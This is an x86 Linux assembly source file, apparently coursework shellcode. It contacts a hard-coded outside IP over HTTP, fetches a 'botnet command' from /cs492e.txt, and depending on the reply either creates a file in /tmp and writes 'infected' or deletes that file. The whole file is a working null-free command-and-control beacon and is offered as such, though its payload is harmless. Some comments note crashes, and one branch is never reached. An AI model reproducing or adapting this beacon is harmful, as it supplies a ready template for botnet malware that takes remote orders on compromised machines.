; To compile it I used nasm -f elf32 [filename]
; ld -melf_i386 -o [filename] [filename].o

global _start

section .text
  _start:

    ; clear all the registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    ; create socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    mov al, 0x66  ; sys_socketcall
    mov bl, 0x1   ; sys_socket
    push 0x6      ; int protocol -> IPPROTO_TCP
    push 0x1      ; int type -> SOCK_STREAM
    push 0x2      ; int domain -> AF_INET
    mov ecx, esp
    int 0x80      ; syscall
    mov edi, eax  ; save socket file descriptor

    ; create sockaddr_in struct
    ; we want to assign the IP address 143.248.38.212
        mov eax, 0xD426F88F
    push edx          ; NULL Padding
    push edx          ; NULL Padding
    push  eax  ; big endian for 143.248.38.212
    push  word 0x5000  ; Port 80
    push  word 0x02   ; AF_INET
    mov esi, esp      ; we want to keep the start address of the struct

    ; connect to the socket
    ; connect (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    xor eax, eax
    xor ebx, ebx
    mov al, 0x66     ; sys_socketcall
    mov bl, 0x3      ; sys_connect
    push 0x10        ; socklen_t addrlen
    push esi         ; const struc sockaddr *addr
    push edi         ; int sockfd -> we saved it in edi before
    mov ecx, esp
    int 0x80         ; syscall for sys_connect, got a crash here

    ; we will now send the request
    ; send(int sockfd, const void *buf, size_t len, int flags)
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
    mov al, 0x66    ; sys_socketcall
    mov bl, 0x9     ; sys_send


    ;"GET /cs492e.txt HTTP/1.0\r\n\r\n"
    ;Now we will push the message in little endian

        push 0x0a0d0a0d
        push 0x302e312f ; 0.1/
    push 0x50545448 ; PTTH
    push 0x20747874 ;  txt
    push 0x2e653239 ; .e29
    push 0x3473632f ; 4sc/
    push 0x20544547 ;  TEG
        mov esi, esp

        push edx
        push 0x1c
        push esi
        push edi

        mov ecx, esp
    int 0x80        ; syscall for sys_send

; we want to receive the message
; read (int sockfd, void *buf, size_t count)
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx

        mov al, 0x03    ; syscall for sys_read
        mov dx, 0x1027   ; we want to read a number of bytes, to have no null bytes
        mov ecx, esi    ; we had the buffer in esi
        mov ebx, edi    ; the file descriptor was stored in edi
        int 0x80        ; syscall for sys_read

; this part is a bit complicated, I did that because the body of the HTTP answer start at offset
; esi + 0xF7, or I only did something like mov edx, [esi + 0xf7], I had some null bytes
; so I made it so at the end we have in edx the correct value with no null bytes
        mov ecx, [esi + 0x000000f7]

; we want to compare the value inside ecx to know if it is 0 or 1
        xor eax, eax
        mov ax, 0x0a30         ; we push 0x0a30 because when I inspect the value of ecx I have "0\n"
    cmp ax, cx        ; we compare the content of ax and cx
        ; je check	
        je remove

create: ; when the botnet command is 1 we will follow this path

    ; we will use the sys_creat syscall

    ; clear all the registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    mov al, 0x08        ; syscall for sys_create
        push edx        ; for the padding
    mov cx, 0511 ; we can play with this value to have different permissions

    push 0x65323934 ; e294
    push 0x73632f70 ; sc/p
    push 0x6d742f2f ; mt//
    mov ebx, esp
    int 0x80

    ; Now we want to open this file and write infected into it
    xor ecx, ecx
    mov al, 0x05    ; syscall for sys_open
    mov cl, 0x02        ; int value of O_RDWR
    push ebx        ; ebx still have the pathname
    int 0x80

    ; we will now write infected
    ;mov ebx, eax    the file descriptor was in eax at the end of open
    xor ebx, ebx
    mov bl, 0x1      ; 1 is the standard output
    mov al, 0x04     ; syscall for sys_write
    push 0x64657463 ; detc
    push 0x65666e69 ; efni
    mov ecx, esp    ; get the start address
    mov dl, 0x08    ; infected is 8 bytes
    int 0x80

        jmp exit

check: ; in this label we will check if the file already exists

; clear all the registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

; we will do that with the open syscall if open return something else than 0
        push eax        ; padding
    push 0x65323934 ; e294
    push 0x73632f70 ; sc/p
    push 0x6d742f2f ; mt//
    mov ebx, esp
    push ebx
    mov al, 0x05   ; syscall for sys_open
    mov cl, 0x02     ; int value of O_RDWR
    int 0x80        ; syscall

        ; we will compare the value in eax to know if the file already exists
        push 0x04
        mov edx, [esp]
        cmp eax, edx
        jne exit
        
remove: ; when the botnet command value is 0 we will follow this path

  ; clear all the registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    ; We will remove the the file /tmp/cs492e
    ; we will use the sys_unlink syscall
    ; unlink(const char *pathname)
    mov al, 0xa    ; syscall for sys_unlink
        push ecx        ; for the padding
    push 0x65323934 ; e294
    push 0x73632f70 ; sc/p
    push 0x6d742f2f ; mt//
        mov ebx, esp
    int 0x80

exit:
        xor eax, eax
        mov al, 0x01
        mov bl, 0x01
        int 0x80
